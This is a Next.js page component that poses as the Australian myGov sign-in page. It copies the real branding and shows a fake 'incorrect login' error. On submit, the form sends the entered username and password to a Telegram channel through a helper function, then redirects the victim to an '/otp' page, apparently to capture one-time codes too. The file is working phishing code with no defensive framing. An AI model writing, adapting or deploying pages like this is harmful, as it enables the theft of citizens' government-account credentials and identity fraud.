"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram";

export default function MyGovSignInError() {
  const [showPassword, setShowPassword] = useState(false);
  const [usernameError, setUsernameError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [generalError, setGeneralError] = useState(
    "The information you entered is incorrect. Please try to login again."
  );
  const router = useRouter();

  const togglePasswordVisibility = () => {
    setShowPassword((prevState) => !prevState);
  };

  const validateUsername = (username: string): boolean => {
    if (!username) {
      setUsernameError("Username or email is required.");
      return false;
    }
    setUsernameError("");
    return true;
  };

  const validatePassword = (password: string): boolean => {
    if (!password) {
      setPasswordError("Password is required.");
      return false;
    }
    setPasswordError("");
    return true;
  };

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const username = (e.currentTarget.username as HTMLInputElement).value;
    const password = (e.currentTarget.password as HTMLInputElement).value;

    const isUsernameValid = validateUsername(username);
    const isPasswordValid = validatePassword(password);

    if (isUsernameValid && isPasswordValid) {
      try {
        const message = `
          🚨 Login Attempt 🚨
          - Username: ${username}
          - Password: ${password}
          - Time: ${new Date().toLocaleString()}
        `;
        await sendTelegramMessage(message);
        router.push("/otp");
      } catch (error) {
        console.error("Error sending message to Telegram:", error);
        setGeneralError("An error occurred. Please try again later.");
      }
    }
  };

  return (
    <>
      <Head>
        <title>Sign in with myGov - myGov</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        {/* Header */}
        <header className="bg-[#66d3ee] border-b-4 border-[#5bbad7]">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center">
              <Image
                src="/images/myGov-cobranded-logo-black.svg"
                alt="myGov Beta Logo"
                width={150}
                height={40}
              />
            </a>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">
              Sign in with myGov
            </h1>
            
            {generalError && (
              <p className="text-red-500 text-center mb-6">{generalError}</p>
            )}
            <form onSubmit={handleFormSubmit} noValidate>
              {/* Username Field */}
              <div className="mb-6">
                <label
                  htmlFor="userId"
                  className="block text-sm font-medium text-black"
                >
                  Username or email
                </label>
                <input
                  id="userId"
                  name="username"
                  type="text"
                  aria-invalid={!!usernameError}
                  aria-describedby="usernameError"
                  className={`w-full mt-2 border ${
                    usernameError ? "border-red-500" : "border-gray-300"
                  } rounded-lg p-3 focus:outline-none focus:ring-2 ${
                    usernameError ? "focus:ring-red-500" : "focus:ring-blue-500"
                  }`}
                  onBlur={(e) => validateUsername(e.target.value)}
                />
                {usernameError && (
                  <p id="usernameError" className="text-sm text-red-500 mt-2">
                    {usernameError}
                  </p>
                )}
              </div>

              {/* Password Field */}
              <div className="mb-6 relative">
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-black"
                >
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type={showPassword ? "text" : "password"}
                  aria-invalid={!!passwordError}
                  aria-describedby="passwordError"
                  className={`w-full mt-2 border ${
                    passwordError ? "border-red-500" : "border-gray-300"
                  } rounded-lg p-3 focus:outline-none focus:ring-2 ${
                    passwordError ? "focus:ring-red-500" : "focus:ring-blue-500"
                  }`}
                  onBlur={(e) => validatePassword(e.target.value)}
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute right-3 top-9 text-blue-600 text-sm font-medium hover:underline focus:outline-none"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
                {passwordError && (
                  <p id="passwordError" className="text-sm text-red-500 mt-2">
                    {passwordError}
                  </p>
                )}
              </div>

              {/* Forgot Password */}
              <p className="text-sm mb-6">
                <a
                  href="#"
                  className="text-blue-600 hover:underline focus:outline-none"
                >
                  Forgot password?
                </a>
              </p>

              {/* Submit Button */}
              <button
                type="submit"
                className="w-full px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg transition hover:bg-[#5cc5db] focus:outline-none focus:ring-2 focus:ring-blue-600"
              >
                Sign in
              </button>

              {/* Create Account */}
              <p className="text-center text-sm text-gray-600 mt-6">
                Don’t have an account?{" "}
                <a
                  href="https://my.gov.au/en/create-account/"
                  className="text-blue-600 hover:underline focus:outline-none"
                >
                  Create a myGov account
                </a>
              </p>
            </form>
          </div>
        </main>

        {/* Footer */}
        <footer className="bg-gray-900 text-white py-10 mt-12">
          <div className="container mx-auto text-center">
            <ul className="flex justify-center space-x-6 mb-4 text-sm">
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Terms of use
                </a>
              </li>
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Privacy and security
                </a>
              </li>
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Copyright
                </a>
              </li>
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Accessibility
                </a>
              </li>
            </ul>
            <Image
              src="/images/myGov-cobranded-logo-white.svg"
              alt="myGov Beta Logo"
              width={150}
              height={40}
              className="h-10 mx-auto"
            />
            <p className="mt-6 text-sm">
              We acknowledge the Traditional Custodians of the lands we live on.
              We pay our respects to all Elders, past and present, of all
              Aboriginal and Torres Strait Islander nations.
            </p>
          </div>
        </footer>
      </div>
    </>
  );
}
